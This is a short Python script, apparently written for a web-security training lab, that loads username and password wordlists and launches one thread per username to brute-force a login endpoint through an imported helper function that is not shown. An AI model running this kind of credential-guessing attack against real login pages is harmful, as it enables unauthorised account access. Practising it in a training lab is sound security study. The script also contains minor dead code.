from re import I
import sys
import threading
import requests
import functions


url = 'https://ac9d1fa31fbe7d25c03b01de00a300b9.web-security-academy.net/login'

user_resource = open(sys.argv[1], 'r')
pass_resource = open(sys.argv[2], 'r')

user_file = user_resource.readlines()
pass_file = pass_resource.readlines()

user_list = []
pass_list = []

total = user_list 

user_list_len = len(user_list)
pass_list_len = len(pass_list)


for user in user_file:
    user_list.append(user.replace('\n', ''))

for password in pass_file:
    pass_list.append(password.replace('\n', ''))

user_resource.close()
pass_resource.close()
    
for user in user_list:

    threading.Thread(
        target=functions.process_pass, args=(url, user, pass_list)
    ).start()
